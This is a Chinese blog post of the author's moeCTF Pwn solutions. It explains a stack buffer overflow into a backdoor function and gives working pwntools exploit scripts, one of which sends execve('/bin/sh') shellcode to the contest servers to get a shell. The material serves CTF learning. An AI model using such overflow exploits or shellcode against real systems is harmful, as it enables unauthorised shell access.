---
title: 【moeCTF 题解 -0x02】Pwn
categories:
  - 计算机
tags:
  - 网络安全
  - moeCTF
  - CTF
abbrlink: moeCTF-02
date: 2020-10-10 00:00:00
---

# 【moeCTF 题解 -0x02】Pwn



```
  _______ _                               _     _          __   _______          ___   _
 |__   __| |                             | |   | |        / _| |  __ \ \        / / \ | |
    | |  | |__   ___  __      _____  _ __| | __| |   ___ | |_  | |__) \ \  /\  / /|  \| |
    | |  | '_ \ / _ \ \ \ /\ / / _ \| '__| |/ _` |  / _ \|  _| |  ___/ \ \/  \/ / | . ` |
    | |  | | | |  __/  \ V  V / (_) | |  | | (_| | | (_) | |   | |      \  /\  /  | |\  |
    |_|  |_| |_|\___|   \_/\_/ \___/|_|  |_|\__,_|  \___/|_|   |_|       \/  \/   |_| \_|

```

pwn 好像距离日常生活有一点遥远呢，学起来都是一些全新的知识，编程中防溢出倒是有关注过，但目的仅仅是为了防止程序不出错。当然“pwn！”的快感也是足够给力，可是 tnl *tnl* ***tnl***，moeCTF 我仅做出来前 4 道题，感觉到现在连门都没有入……（这里可能因为学习成本的原因，后面的题必要的知识储备还没来得及学）

<!--more-->

<br/>

> **【moeCTF 题解】总目录如下：**
>
> * [【moeCTF 题解 -0x00】序（包括 Sign in）](https://framist.github.io/post/moeCTF-00.html)
> * [【moeCTF 题解 -0x01】Reverse（包括 Android、IoT）](ttps://framist.github.io/post/moeCTF-01.html)
> * [【moeCTF 题解 -0x02】Pwn](ttps://framist.github.io/post/moeCTF-02.html)
> * [【moeCTF 题解 -0x03】Algorithm](ttps://framist.github.io/post/moeCTF-03.html)
> * [【moeCTF 题解 -0x04】Crypto（包括 Classic Crypto）](https://framist.github.io/post/moeCTF-04.html)
> * [【moeCTF 题解 -0x05】Misc](ttps://framist.github.io/post/moeCTF-05.html)
> * [【moeCTF 题解 -0x06】Web](ttps://framist.github.io/post/moeCTF-06.html)
<br/>


4/10

## Welcome to pwn

> 50points
>
> ### 欢迎来到 pwn 世界~
>
> 题目地址：`nc sec.eqqie.cn 10006`
>
> ### Q&A
>
> #### Q1 什么是 pwn？
>
> - 看看 [百度百科 - Pwn](https://baike.baidu.com/item/Pwn/5321286?fr=aladdin) 上的解释。
>
> #### Q2 如何学习？
>
> 1. 借助 [ctfwiki](https://wiki.x10sec.org/pwn/arm/environment/)，这是前辈们整理出来的纲要，针对性很强，但是对于入门而言可能有些不太友好。
> 2. 使用搜索引擎，前人的理解和表达可能对你有很大的帮助。
> 3. 在非比赛情况下，可以观摩他人的解题思路，但是在比赛情况下，这是违规行为！
> 4. 市面上少量的出版书籍，但是这些书籍个人觉得对 0 基础新手并不友好。
>
> #### Q3 需要什么基础？
>
> 1. 基本的 C 语言
> 2. 一点编译原理
> 3. 一点 Linux 基础
> 4. 一点 python
> 5. 都学得很好再玩不太现实，可以通过比赛来促进学习
>
> #### Q4 怎样解题？
>
> 1. 题目的二进制文件一般会被部署到服务器上，使用`nc xx.xx.xx.xx(ip) xxxx(端口)`命令可以与服务器进行交互。并且该二进制文件的副本（与服务器上的完全相同或者基本相同）将作为附件形式被提供给选手下载。
> 2. 你需要逆向分析二进制文件副本中存在的可利用漏洞，针对其编写`Exploit`(漏洞利用脚本)，然后向服务器发起攻击，拿到服务器上保存的`flag文件或字符串`，将其提交至本平台。
> 3. 注意命令行中的`nc`并不是做题工具，你需要在 Linux 下安装`pwntools`库（或者其它），用于编写可用性较高的`Exploit`。至于如何安装，如何使用，就需要聪明的你发挥自己的学习能力啦~
> 4. 本题作为示例，不提供二进制文件，只需要按照提示进行操作即可获得`flag`。
>
> #### Q5 我可以搅屎吗？
>
> - 拿到 shell 输入`escape`可以沙箱逃逸（×

<br/>

解法：**填满她！**

![image-20201010002007625](http://framist-bucket-openread.oss-cn-shanghai.aliyuncs.com/img/2023/08/15/20230815210547.png)

Great！好耶！获得 flag：`moectf{W3lc0m3_t0_tH3_w0r1d_0f_PWN!}`



<br/>

## Pwn 从入门到入狱

> 50points
>
> **网络安全为人民，网络安全靠人民**
>
> 学了 PWN 以后还请做一位守法的好公民（



开题，是一篇 [arttnba3](https://arttnba3.cn/) 大大写的 Pwn 从入门到入狱指南

通读全篇还是*感觉有 yi 丶丶头大*

先得到文章最后 flag 再说#(滑稽)：` moectf{0hhhhhhh_I_kn0w_hoW_t0_R3v3rs3!}`



> CTF TO LEARN, NOT LEARN TO CTF



> 为了拥有“能够 getshell 任意一台设备”的能力而努力吧！新生代的黑客们！

<br/>

## Baby pwn

> 100points
>
> 尝试实战一下
>
> - 第一个 hint 是小贴士
> - 实在没头绪就看看第二个 hint (分数减半)
>
> 
>
> 题目地址：`nc sec.eqqie.cn 10003`

**首先运行一下**

```bash
$ ./pwn1
Tell me your name: framist
Hello framist!

$ nc sec.eqqie.cn 10003
Tell me your name: arttnba3
Hello arttnba3!
```

：3 你好呀~

并没有 flag 相关的信息。

<br/>

**使用`checksec`指令查看程序的保护开启情况**


```bash
checksec --file=pwn1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified     Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols     No       0    pwn1
```

*不知道为啥我的`checksec`跟其他人不太一样...*

<br/>

**上 IDA64，找到一些关键信息**：

```asm
.text:0000000000400676 ; __int64 backdoor(void)
.text:0000000000400676                 public _Z8backdoorv
.text:0000000000400676 _Z8backdoorv    proc near
.text:0000000000400676 ; __unwind {
.text:0000000000400676                 push    rbp
.text:0000000000400677                 mov     rbp, rsp
.text:000000000040067A                 mov     edi, offset command ; "/bin/sh"
.text:000000000040067F                 call    _system
.text:0000000000400684                 nop
.text:0000000000400685                 pop     rbp
.text:0000000000400686                 retn
.text:0000000000400686 ; } // starts at 400676
.text:0000000000400686 _Z8backdoorv    endp
.text:0000000000400686
.text:0000000000400687
.text:0000000000400687 ; =============== S U B R O U T I N E 
.text:0000000000400687
.text:0000000000400687 ; Attributes: bp-based frame
.text:0000000000400687
.text:0000000000400687 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000400687                 public main
.text:0000000000400687 main            proc near               ; DATA XREF: _start+1D↑o
.text:0000000000400687
.text:0000000000400687 var_50          = qword ptr -50h
.text:0000000000400687 var_44          = dword ptr -44h
.text:0000000000400687 var_40          = byte ptr -40h
.text:0000000000400687
.text:0000000000400687 ; __unwind {
.text:0000000000400687                 push    rbp
.text:0000000000400688                 mov     rbp, rsp
.text:000000000040068B                 sub     rsp, 50h
.text:000000000040068F                 mov     [rbp+var_44], edi
.text:0000000000400692                 mov     [rbp+var_50], rsi
.text:0000000000400696                 mov     rax, cs:stdin@@GLIBC_2_2_5
.text:000000000040069D                 mov     ecx, 0          ; n
.text:00000000004006A2                 mov     edx, 2          ; modes
.text:00000000004006A7                 mov     esi, 0          ; buf
.text:00000000004006AC                 mov     rdi, rax        ; stream
.text:00000000004006AF                 call    _setvbuf
.text:00000000004006B4                 mov     rax, cs:__bss_start
.text:00000000004006BB                 mov     ecx, 0          ; n
.text:00000000004006C0                 mov     edx, 2          ; modes
.text:00000000004006C5                 mov     esi, 0          ; buf
.text:00000000004006CA                 mov     rdi, rax        ; stream
.text:00000000004006CD                 call    _setvbuf
.text:00000000004006D2                 mov     edi, offset format ; "Tell me your name: "
.text:00000000004006D7                 mov     eax, 0
.text:00000000004006DC                 call    _printf
.text:00000000004006E1                 lea     rax, [rbp+var_40]
.text:00000000004006E5                 mov     rsi, rax
.text:00000000004006E8                 mov     edi, offset aS  ; "%s"
.text:00000000004006ED                 mov     eax, 0
.text:00000000004006F2                 call    _scanf
.text:00000000004006F7                 lea     rax, [rbp+var_40]
.text:00000000004006FB                 mov     rsi, rax
.text:00000000004006FE                 mov     edi, offset aHelloS ; "Hello %s!"
.text:0000000000400703                 mov     eax, 0
.text:0000000000400708                 call    _printf
.text:000000000040070D                 mov     eax, 0
.text:0000000000400712                 leave
.text:0000000000400713                 retn
.text:0000000000400713 ; } // starts at 400687
.text:0000000000400713 main            endp
.text:0000000000400713
.text:0000000000400713 ; --------------------------------------------
.text:0000000000400714                 align 20h
```

其中两个关键函数的反编译如下：

* 后门函数

```c
int backdoor(void)
{
  return system("/bin/sh");
}
```

* 主函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+10h] [rbp-40h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("Tell me your name: ", 0LL, argv);
  scanf("%s", &v4);
  printf("Hello %s!", &v4);
  return 0;
}
```

这里发现`scanf("%s", &v4)`语句没有限制输入的长度，可以利用其进行溢出

于是构造 playload 如下：

```python
# nc sec.eqqie.cn 10003
from pwn import *

p = remote('sec.eqqie.cn',10003)
p.recv()

sys_addr = p64(0x400676)
payload = b'A'*(0x40+8) + sys_addr
p.sendline(payload)

p.recv()

p.sendline('ls')
p.sendline('cat flag.txt')
p.interactive()
# 此处有疑问
```

运行此脚本可以 get flag：`moectf{a0e65c41-fe8a-4db9-a070-f6593a5858c3}`

- [ ] 注：这里我还有一些疑问：在上面这个脚本中如果 getshell 之后直接进入交互模式（`p.interactive()`），手动输入`ls`等指令，系统会自动在前面加上一个序号，如`1: ls`，导致指令不被执行，目前还不知道是什么原因。指望大佬相助。

<br/>

## Baby shellcode

> 100poins
>
> 你知道什么是 shellcode 吗？题目地址：`nc sec.eqqie.cn 10000`

```bash
$ nc sec.eqqie.cn 10000
Show me your shellcode: I do not know what is shellcode

^C
```



- [ ] 用 IDA64 打开，提示是 32 位程序，于是用 32 位的 IDA 打开（这里好像有点不对……

```asm
.text:08048080 ; =============== S U B R O U T I N E =======================================
.text:08048080
.text:08048080
.text:08048080                 public _start
.text:08048080 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048080                 xor     eax, eax
.text:08048082                 mov     edx, 18h        ; len
.text:08048087                 mov     ecx, offset msg ; addr
.text:0804808C                 mov     ebx, 1          ; fd
.text:08048091                 mov     eax, 4
.text:08048096                 int     80h             ; LINUX - sys_write
.text:08048098                 sub     esp, 100h
.text:0804809E                 mov     ebx, 0          ; fd
.text:080480A3                 mov     ecx, esp        ; addr
.text:080480A5                 mov     edx, 100h       ; len
.text:080480AA                 mov     eax, 3
.text:080480AF                 int     80h             ; LINUX - sys_read
.text:080480B1                 jmp     esp
.text:080480B1 _start          endp
.text:080480B1
.text:080480B1 ; ---------------------------------------------------------------------------
.text:080480B3                 db 0B8h
.text:080480B4                 dd 1
.text:080480B8                 db 0CDh, 80h
.text:080480B8 _text           ends
.text:080480B8
.data:080490BC ; ===========================================================================
.data:080490BC
.data:080490BC ; Segment type: Pure data
.data:080490BC ; Segment permissions: Read/Write
.data:080490BC _data           segment dword public 'DATA' use32
.data:080490BC                 assume cs:_data
.data:080490BC                 ;org 80490BCh
.data:080490BC msg             db  53h ; S             ; DATA XREF: LOAD:0804805C↑o
.data:080490BC                                         ; _start+7↑o
.data:080490BD                 db  68h ; h
.data:080490BE                 db  6Fh ; o
.data:080490BF                 db  77h ; w
.data:080490C0                 db  20h
.data:080490C1                 db  6Dh ; m
.data:080490C2                 db  65h ; e
.data:080490C3                 db  20h
.data:080490C4                 db  79h ; y
.data:080490C5                 db  6Fh ; o
.data:080490C6                 db  75h ; u
.data:080490C7                 db  72h ; r
.data:080490C8                 db  20h
.data:080490C9                 db  73h ; s
.data:080490CA                 db  68h ; h
.data:080490CB                 db  65h ; e
.data:080490CC                 db  6Ch ; l
.data:080490CD                 db  6Ch ; l
.data:080490CE                 db  63h ; c
.data:080490CF                 db  6Fh ; o
.data:080490D0                 db  64h ; d
.data:080490D1                 db  65h ; e
.data:080490D2                 db  3Ah ; :
.data:080490D3                 db  20h
.data:080490D4                 db  17h
.data:080490D4 _data           ends
```

试着反编译一下主程序：

```c
void start()
{
  int v0; // eax
  int v1; // eax
  int v2; // [esp-100h] [ebp-100h]

  v0 = sys_write(1, &msg, 0x18u);
  v1 = sys_read(0, &v2, 0x100u);
  JUMPOUT(__CS__, &v2);
}
```

:thinking:没有发现什么名堂，可能真的是给它什么`shellcode`就行了叭

遂百度`shellcode`：

> shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，因为经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。可在暂存器 eip 溢出后，塞入一段可让 CPU 执行的 shellcode 机器码，让电脑可以执行攻击者的任意指令。
>
> ——百度百科

即`shellcode`就是一串可以返回 shell 的机器指令码，使得在没有写后门来 getshell 的程序中也能 getshell，在 linux 上典型的有：
[Linux/x86 - execve(/bin/sh) + Polymorphic Shellcode (48 bytes)](https://www.exploit-db.com/exploits/13312)

直接抄答案就行：

```shell
# nc sec.eqqie.cn 10000
from pwn import *

p = remote('sec.eqqie.cn',10000)
payload = b''

# shellcode
payload += b"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
payload += b"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
payload += b"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
payload += b"\x32\xc1\x51\x69\x30\x30\x74\x69"
payload += b"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
payload += b"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

p.sendline(payload)
p.sendline("ls")
p.sendline("cat flag.txt")
p.interactive()
```

运行得到 flag：`moectf{D0_yoU_kN0w_she11c0d3?}`

更多相关知识参考[从 0 开始 CTF-PWN（三）没有 system 怎么办？构造你的 shellcode](https://bbs.pediy.com/thread-259723.html)，写的非常详尽。

<br/>

---

接下来的题都没做了。感觉前面几题也做得一知半解，有待慢慢入门……

<br/>

-----

*未完待续……*